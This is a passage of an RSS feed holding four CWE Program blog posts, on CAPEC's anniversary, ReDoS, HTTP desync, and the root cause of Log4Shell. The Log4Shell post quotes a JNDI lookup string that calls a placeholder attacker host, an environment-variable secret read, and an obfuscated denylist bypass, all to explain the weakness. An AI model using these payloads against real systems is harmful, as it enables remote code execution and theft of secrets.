Mar 2022 00:27:57 GMT","atom:updated":"2022-03-23T15:11:15.004Z","content:encoded":{"#cdata-section":"<figure><img alt=\"Happy Anniversary Cake\" src=\"https://cdn-images-1.medium.com/max/1024/1*lYaLKWReeDv8Cvs5sRCm5A.jpeg\" /><figcaption>CAPEC is not a piece of cake…</figcaption></figure><p>March 2022 is the 15th anniversary of <a href=\"https://capec.mitre.org/\">Common Attack Pattern Enumerations and Classifications (CAPEC™)</a>. On this important milestone, we thought we would reflect on the development of the project and the plans for the future, with collaboration of the CAPEC community.</p><p>The idea of a software design pattern had been around for quite some time [1], when security researchers realized it could be used to describe cyber-attacks [2]. With support from DHS, Cigital (later part of Synopsys) and MITRE created the “Common Attack Pattern Enumeration and Classification (CAPEC)” in 2006 as a corpus of “‘”attack patterns’”— or design patterns for attackers. At the time, <a href=\"https://cwe.mitre.org/\">Common Weakness Enumeration (CWE™)</a> was already in development and CAPEC initially focused on how attackers exploit CWEs to enable attacks. This type of information is valuable to the community as it helps organizations better manage cyber risk and avoid/mitigate the types of mistakes and attacks that put enterprises at risk. CAPEC 1.0 was released 15 years ago this month and contained 91 attack patterns. CAPEC and CWE were part of the MITRE/DHS establishment of various corpuses under the umbrella concept of “Making Security Measurable”.</p><p>In 2010, CAPEC’s scope extended beyond software with the inclusion of attack patterns across three additional domains — social engineering, physical security, and supply chain. These entries were often less based on the traditional exploitation of a CWE, which at the time still included only software-related weaknesses. In collaboration with community stakeholders across academia, government, and industry, CAPEC grew to 450 entries.</p><p>From the beginning, CAPEC has engaged its user community to find ways of increasing its value and utility. The CAPEC team has worked with the OWASP, WASC, and MITRE <a href=\"https://attack.mitre.org/\">ATT&amp;CK</a> teams over the years to integrate information and expand coverage. CAPEC grew to be recognized as a vital corpus of cyber security information. ITU recommended CAPEC in 2013 [3] and ISO included CAPEC in its technical report in 2015 [4]. Adam Shostack, who developed STRIDE at Microsoft, commented in his seminal book “Threat Modeling: Designing for Security” [5] as “The impressive size and scope of CAPEC may … make it easier to use for someone who’s just getting started in security, where specificity helps to identify attacks.”</p><p>Many individuals have been responsible for the concept and the development of CAPEC over the years. It is difficult to name them all, but we would like to especially mention and thank the following people: Gary McGraw, Sean Barnum, Bob Martin, Joe Jarzombek, Mark Loveless, Drew Buttner, Eric Dalci, Romain Gaucher, Tom Stracener, Pravir Chandra and Rich Struse.</p><p>As of February 2022, when <a href=\"https://capec.mitre.org/data/index.html\">CAPEC version 3.7</a> was released; there are 546 attack patterns in the corpus. Looking forward, CAPEC hopes to continue improving and modernizing the program through direct engagement with community stakeholders in several key areas:</p><ul><li>Supply chain domain</li><li>Better integration with CWE (especially with its expansion into the hardware domain)</li><li>User experience (e.g., a more dynamic website, a REST API)</li><li>Develop a lesson plan using CWE/CAPEC for use in university curriculum</li><li>Entry completeness and quality throughout the corpus</li></ul><p>These are challenging tasks that require community input and contributions, and there are many ways for you to get involved. Consider joining the <a href=\"https://cwe.mitre.org/news/index.html#june102021_Join_the_CWE_CAPEC_User_Experience_Working_Group\">CWE/CAPEC User Experience Working Group</a> or one of the other community groups mentioned on the landing page of the CWE and CAPEC sites. Other working groups and special interest groups are in the works, including one related to the REST API.</p><p>We invite you to be a part of the future of CWE/CAPEC!</p><p>A big thanks from the community to Rich Piazza as the primary author of this blog and the CAPEC lead for letting the community know what is going on.</p><p><strong>References</strong></p><p>[1] E. Gamma, R. Helm, R. Johnson and J. Vlissides, Design Patterns: Elements of Reusable Object-Oriented Software, Addison-Wesley, 1995.</p><p>[2] McGraw, Gary. Software Security: Building Security In. Boston, MA: Addison-Wesley, 2006</p><p>[3] <a href=\"https://www.itu.int/ITU-T/recommendations/rec.aspx?rec=11753\">https://www.itu.int/ITU-T/recommendations/rec.aspx?rec=11753</a></p><p>[4] <a href=\"https://www.iso.org/standard/68837.html\">https://www.iso.org/standard/68837.html</a></p><p>[5] A. Shostack, Threat Modeling: Designing for Security, John Wiley &amp; Sons, 2014</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=43c2b8d705e1\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"Mind your REGEX or it can put your program into an infinite loop"},"link":"https://medium.com/@CWE_CAPEC/mind-your-regex-or-it-can-put-your-program-into-an-infinite-loop-3a5f362f8300?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/3a5f362f8300"},"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Tue, 01 Feb 2022 19:39:16 GMT","atom:updated":"2022-03-23T22:35:25.423Z","content:encoded":{"#cdata-section":"<figure><img alt=\"REGEX that matches the chours of “Never going to Give you Up”\" src=\"https://cdn-images-1.medium.com/max/975/1*6FZnd4ePPyMvGuVWy2V8rg.png\" /></figure><p>If your project uses or implements <a href=\"https://en.wikipedia.org/wiki/Regular_expression\">regular expressions</a>, you need to check them for a weakness that might allow an attacker to stop your program from working. Regular expressions, also known as regex, allow programmers to parse or replace text with a common notation. If your project takes in input, there is a good chance that you will eventually need to use this tool.</p><p>In <a href=\"https://web.archive.org/web/20031120114522/http:/www.cs.rice.edu/~scrosby/hash/slides/USENIX-RegexpWIP.2.ppt\">2003</a>, there was a presentation about a weakness in the implementation of specific ways that these expressions were implemented. While a select community knew about this weakness for a long time, this was popularized in 2021 under the name <a href=\"https://blog.doyensec.com/2021/03/11/regexploit.html\">Regexploit</a> or <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">ReDoS</a>. If an attacker has a specifically crafted input, some implementations could cause a CPU to run at 100% for years. As an example, this weakness led to a vulnerability reported in February 2020 (<a href=\"https://www.cve.org/CVERecord?id=CVE-2020-5243\">CVE-2020–5243</a>) where parsing HTTP(S) User-Agent strings could shut down a web server.</p><p>The denial of service results when the regex is looking to match repeated characters and tries multiple ways of matching them. It does this by trying the longest string that would match and then repeatedly trying smaller strings until success or failure — a process feature called <a href=\"https://en.wikipedia.org/wiki/ReDoS#Exponential_backtracking\">backtracking</a>. A recent CWE, <a href=\"https://cwe.mitre.org/data/definitions/1333.html\">CWE-1333: Inefficient Regular Expression Complexity</a>, provides more details on the issue that can also be demonstrated in a <a href=\"https://regex101.com/r/m4lsbq/4\">useful tool called regex101</a>. The tool shows how removing underscores (_) in the input reduces the number of processing steps.</p><p><strong>What Can You and Your Team Do?</strong></p><p>1. Don’t use regex that support <a href=\"https://stackoverflow.com/questions/48611167/prevent-backtracking-on-regex-to-find-non-comment-lines-not-starting-with-inden\">backtracking</a>. If your programming language uses a backtracking system by default and you can’t limit regexes to those that would support backtracking, look for a library that does not use this method. These could be <a href=\"https://github.com/google/re2/issues/204\">slower</a> and might not support capture groups (e.g., the <a href=\"https://github.com/google/re2\">re2</a> libraries).</p><p>2. If you must use regex with backtracking:</p><p>a. Limit the exposure of untrusted input into your regexes.</p><p>b. Break up your regex into separate lines to minimize backtracking.</p><p>c. See if you can mark sensitive parts of your regex to not use backtracking.</p><p>d. Provide functionality that would normally be provided with backtracking outside of regex. (e.g., to remove whitespace, use strip and trim functions). Test regex in the <a href=\"https://github.com/doyensec/regexploit\">Regexploit</a> tool.</p><p>e. Limit input length (with some expressions being <a href=\"https://en.wikipedia.org/wiki/Big_O_notation\">O³ or O⁴</a>, the amount of work that can be requested for a small input string can be rather large).</p><p>f. Set up a system to limit the time your regexes can run and report when they cause a catastrophic failure so you can test and fix these.</p><p>There are several real-world examples of products that have fallen victim to this weakness. Due to the lack of <a href=\"https://www.regular-expressions.info/refcapture.html\">capture groups</a>, the popular network security monitor <a href=\"https://zeek.org/\">Zeek</a> uses <a href=\"https://github.com/zeek/zeek/issues/426\">backtracking</a>. Thus, users might create a regex filter that could lead to a denial of service. Historically, popular command-line tools ‘grep’ and ‘awk’ had this issue and were <a href=\"https://swtch.com/~rsc/regexp/regexp1.html\">replaced</a> in 2004–2005 with safer versions. <a href=\"https://capec.mitre.org/data/definitions/492.html\">CAPEC-492: Regular Expression Exponential Blowup</a> describes the process, or attack pattern, that an adversary takes to exploit CWE-1333: Inefficient Regular Expression Complexity. If you don’t want your software to be shut down during a critical time, understanding and avoiding this weakness is critical.</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=3a5f362f8300\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"HTTP Desync: The Redux and Evolution of HTTP Smuggling and Splitting Attack Techniques"},"link":"https://medium.com/@CWE_CAPEC/http-desync-the-redux-and-evolution-of-http-smuggling-and-splitting-attack-techniques-a698c265c9a1?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/a698c265c9a1"},"category":{"#cdata-section":"cybersecurity"},"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Wed, 12 Jan 2022 17:00:40 GMT","atom:updated":"2022-01-12T19:27:49.175Z","content:encoded":{"#cdata-section":"<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*QbThbMnKCJDj0612qBSgPw.jpeg\" /><figcaption>Credit: <a href=\"https://www.pexels.com/@padrinan\">Miguel Á. Padriñán</a></figcaption></figure><p><em>A special thanks to Adam Chaudry for his contribution to this blog.</em></p><p><strong>A Brief History of HTTP Boundary-Based Attacks</strong></p><p>Anyone familiar with modern telecommunications understands the fundamental importance of HTTP as the foundation for information exchange across the World Wide Web. HTTP supports the implementation of client-server connections that underpin web browsing and communication via HTTP messages. This includes HTTP requests configured and sent from a client to request data/resources from a server, as well as HTTP responses from a server back to the client with requested items or a status message.</p><p>However, throughout the early 2000s, vulnerabilities were identified within HTTP infrastructure, opening the door for a set of related attack patterns/techniques against HTTP agents. Such attacks include HTTP request splitting, HTTP response splitting, HTTP request smuggling, and HTTP response smuggling.</p><p>These attacks exploit message parsing vulnerabilities against HTTP agents running HTTP/1.0/1.1, by manipulating HTTP messages (request and/or response) to interfere with the HTTP agents’ interpretation of HTTP messages. This results in unauthorized and malicious HTTP messages being secretly sent and received to allow attacks such as cross-site scripting (XSS), cache poisoning, authentication bypass, content spoofing, resource location spoofing, session hijacking, and more.</p><p>The revelation of these attack techniques was made known to the Information Technology and Information Security communities in the early 2000s by various whitepapers and reports, such as the 2004 Sanctum Inc. Whitepaper <a href=\"https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf\">Divide and Conquer</a> and the 2005 Watchfire whitepaper <a href=\"https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf\">HTTP Request Smuggling</a>. These types of attack plagued the security of HTTP web applications for years, with relevant CVEs still being released to this day.</p><p>Although there has been a concerted effort to evolve the HTTP protocol to address the weaknesses behind these attacks, many HTTP agents are still not <a href=\"https://www.rfc-editor.org/\">RFC</a> complaint. This resulted in the configuration of HTTP infrastructure to accommodate varied HTTP agents, causing parsing discrepancies to exist in network paths interpreting HTTP messages. These discrepancies have continued allowing HTTP Smuggling and Splitting to take place.</p><p><strong>Terminology Confusion of HTTP Request/Response Splitting/Smuggling</strong></p><p>Despite being very commonplace in web-based attacks, there has been a lot of confusion about HTTP smuggling and splitting in the lexicon of IT security professionals. Many misunderstand the differences among these four attack techniques and often use the terms interchangeably. Additionally, most of the material pertaining to these attacks reference outdated sources from over 10 years ago and don’t incorporate the evolutions of the attacks.</p><p>James Kettle, Director of Research at PortSwigger, brought this topic back into the limelight with <a href=\"https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\">HTTP Desync Attacks: Request Smuggling Reborn</a>, where he elaborates on new attack vectors and variants tied to HTTP request smuggling. Kettle uses the term “HTTP Desync” to describe this evolution of HTTP smuggling but does not explicitly define the term. For the CAPEC/CWE projects, we are defining HTTP Desync as “the modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.”</p><p><strong>CAPEC Redux of HTTP Desync Entries</strong></p><p>Kettle’s publication inspired the CAPEC Content Team to review and reevaluate four relevant CAPEC entries. It was determined, after extensive research, that significant improvements were needed to properly differentiate these attacks. We considered combining the two Splitting CAPEC entries and the two Smuggling entries, but the nuanced differences between the four entries indicated that all four should be retained but fully re-written to make those differences clear.</p><p>Also, it is important to note the difference between HTTP splitting and HTTP smuggling, since HTTP smuggling evolved from previous HTTP splitting patterns which are commonly remediated against. HTTP splitting is defined by <a href=\"https://web.archive.org/web/20190114230829/http:/www.securiteam.com/securityreviews/5CP0L0AHPC.html\">Amit Klein</a> as “the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension…the messages sent are 100% valid and RFC compliant.” Klein goes on to define HTTP Smuggling as “the act of forcing a sender of (HTTP) messages to emit [a] data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention…this is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way.”</p><p>Ultimately, HTTP splitting is solely dependent upon the embedding/injection of special characters and character encoding within HTTP headers and web/browser object parameters. In contrast, HTTP smuggling does not, and it simply depends upon discrepancies in the interpretation of various HTTP headers.</p><p><strong>The Updated Entries</strong></p><p>Check out the new CAPECs here:</p><ol><li>HTTP Request Smuggling (<a href=\"https://capec.mitre.org/data/definitions/33.html\">CAPEC-33</a>)</li></ol><p>2. HTTP Response Smuggling (<a href=\"https://capec.mitre.org/data/definitions/273.html\">CAPEC-273</a>)</p><p>3. HTTP Request Splitting (<a href=\"https://capec.mitre.org/data/definitions/105.html\">CAPEC-105</a>)</p><p>4. HTTP Response Splitting (<a href=\"https://capec.mitre.org/data/definitions/34.html\">CAPEC-34</a>)</p><p>Our next step will be to make appropriate changes to CWE to better characterize the weaknesses that enable these four attacks to be conducted.</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=a698c265c9a1\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"Neutralizing Your Inputs: A Log4Shell Weakness Story"},"link":"https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/89954c8b25c9"},"category":[{"#cdata-section":"vulnerability-management"},{"#cdata-section":"log4j"},{"#cdata-section":"java"},{"#cdata-section":"apache"},{"#cdata-section":"log4shell"}],"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Fri, 17 Dec 2021 17:48:15 GMT","atom:updated":"2022-01-05T16:20:30.496Z","content:encoded":{"#cdata-section":"<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*Hygx67ieBXMbzH6e_oj6Pg.jpeg\" /><figcaption>Source: <a href=\"https://picryl.com/media/moving-logs-1917-7cb2cd\">https://picryl.com/media/moving-logs-1917-7cb2cd</a></figcaption></figure><p>The recent vulnerability in log4j (<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\">CVE-2021–44228</a>), also called “Log4Shell,” has received a lot of attention because of how dangerous and <a href=\"https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592\">widespread</a> it is. Defenders in vulnerability management and incident response will likely be very busy with this one for a while.</p><p>While Log4Shell has been a hot topic, there hasn’t been much discussion about the original mistakes made, i.e., the weaknesses involved, and how the initial failure to address the root cause weakness led to additional pain (and multiple fixes) for defenders within the first week of disclosure. Also, you might have noticed how the same CVE was mapped to different CWEs by multiple sources. Let’s look a little deeper into the weakness that started it all.</p><p><strong>Getting to Root Cause — The Initial Mistake</strong></p><p>An important aspect of the vulnerability is that log4j can treat substrings of the form “${xyz}” as executable expressions. Here, the “$” and “{}” characters are <a href=\"https://cwe.mitre.org/documents/glossary/index.html#Special%20Element\">special elements</a> that change how the string is generated: the contents of the “${xyz}” sequence are executed like code. The <a href=\"https://cybersecurity.ieee.org/blog/2015/11/13/avoiding-the-top-10-security-flaws/\">mixture of control logic (or commands) with data in the same string or message</a> is a commonly known, ubiquitous design flaw in many protocols, functions, and languages, which can make it very easy for programmers to introduce vulnerabilities where malicious data is treated as a command. It doesn’t take much imagination to see that things could get really bad, really quick.</p><p>As seen in many exploit examples for this vulnerability, the attacker can inject executable expressions by using the “${xyz}” style format. However, injection is an attack. The key weakness consists of log4j not “neutralizing” potentially dangerous inputs that contain special elements, which are later fed to a command interpreter. The CWE glossary defines <a href=\"https://cwe.mitre.org/documents/glossary/index.html#Neutralization\">neutralization</a> as “the process of ensuring that input or output has certain security properties before it is used,” which broadly includes protection mechanisms such as filtering, canonicalization, validation, etc. The high-level class <a href=\"https://cwe.mitre.org/data/definitions/74.html\">CWE-74</a> covers improper neutralization, with many well-known descendants related to SQL injection (CWE-89), OS command injection (CWE-78), and others.</p><p>For this log4j issue, the most precise CWE available is <a href=\"https://cwe.mitre.org/data/definitions/917.html\">CWE-917</a>: Improper Neutralization of Special Elements used in an Expression Language Statement (‘Expression Language Injection’). This entry could be found by navigating the sub-tree under CWE-74, or by knowing that the “${}” sequences are called expression language. Through the <a href=\"https://cwe.mitre.org/news/index.html#june102021_Join_the_CWE_CAPEC_User_Experience_Working_Group\">User Experience Working Group</a>, we’re trying to find ways to make CWE easier to use, so that it’s easier to find the best match.</p><p><strong>CWE Mapping — Your Mileage May Vary</strong></p><p>So, why isn’t CWE-917 universally used for Log4Shell? Part of it comes down to the perspective of the person who is mapping to CWE and how deeply they have analyzed the mistake that created the vulnerability.</p><p>Consider a common exploit string that is injected into various inputs that are eventually processed by log4j:</p><p>${jndi:ldap://adversary.example.com/payload}</p><p>As <a href=\"https://www.crowdstrike.com/blog/log4j2-vulnerability-analysis-and-mitigation-recommendations/\">described</a> elsewhere, this expression triggers a call to an adversary-controlled server that returns a Java class with malicious code that is then executed by log4j. This process effectively involves deserialization, so people might map this to <a href=\"https://cwe.mitre.org/data/definitions/502.html\">CWE-502</a>: Deserialization of Untrusted Data. However, the ability to inject code is a consequence (or technical impact) resulting from the exploitation of the actual weakness, which is allowing attacker-injected expressions to trigger the download of the malicious code in the first place.</p><p>There are also exploits that involve accessing sensitive information, such as using “${env:AWS_SECRET_ACCESS_KEY}” to <a href=\"https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html\">read an environment variable containing a secret API key</a>. Because information is leaked, somebody might map the issue to <a href=\"https://cwe.mitre.org/data/definitions/200.html\">CWE-200</a>: Exposure of Sensitive Information to an Unauthorized Actor.</p><p>At best, for this particular vulnerability, CWE-502 and CWE-200 are “resultant” from the original mistake. They are part of a chain of insecure behaviors that are enabled by the “root cause” weakness, improperly neutralizing expressions (i.e., CWE-917). If an expression language is very powerful, dozens of CWEs could be “resultant” from the mistake of simply allowing the expression language to be processed. Our <a href=\"https://cwe.mitre.org/documents/cwe_usage/guidance.html\">CWE mapping guidance</a> generally discourages mapping to a CWE if it’s effectively a “technical impact” stemming directly from a root cause CWE, instead of a completely independent mistake.</p><p>Many people thinking about the root cause might simply regard this problem as “improper input validation” (<a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20</a>), but that’s a very general concept — a high-level class weakness type. Also, you can’t always validate whether incoming data is correct or not. Here, log4j is a general-purpose logging product that basically needs to accept log messages with arbitrary contents (since the messages will vary widely depending on the particular app using log4j). So, CWE-917 (as a base-level weakness) remains more precise and a better choice.</p><p>If you look at the <a href=\"https://logging.apache.org/log4j/2.x/security.html\">fixes</a> for this weakness, these special elements are basically treated as regular characters by simply not processing them anymore. Now THAT’s neutralization! Early fixes attempted to minimize what functionality the attackers can access, although it was found that some other expression variants could still be processed.</p><p><strong>The Final Word — What to Do and Not Do</strong></p><p>Many developers or other defenders might be tempted to choose a quick-and-dirty fix by using a <a href=\"https://cwe.mitre.org/documents/glossary/index.html#Denylist\">denylist</a> to reject any inputs that contain “jndi:ldap:” substrings. At best, this is a delaying tactic, not a complete fix, because denylists don’t always remove every possible “bad” input (<a href=\"https://cwe.mitre.org/data/definitions/184.html\">CWE-184</a>). For example, “${jndi:ldap:…” <a href=\"https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html\">could be encoded</a> as “${${::-j}ndi:…” — i.e. a nested expression would be called that would just produce the “j” in the “jndi”.</p><p>As we’ve seen with log4j, and with lots of other software, when addressing a vulnerability, it is important to identify and mitigate the root cause weakness that starts the problem and not one of the resultant weaknesses that appear later in the chain. There might be alternative ways to instantiate those weaknesses, leading to another round of patching and testing.</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=89954c8b25c9\" width=\"1\" height=\"1\" alt=\"\">"}}]}}}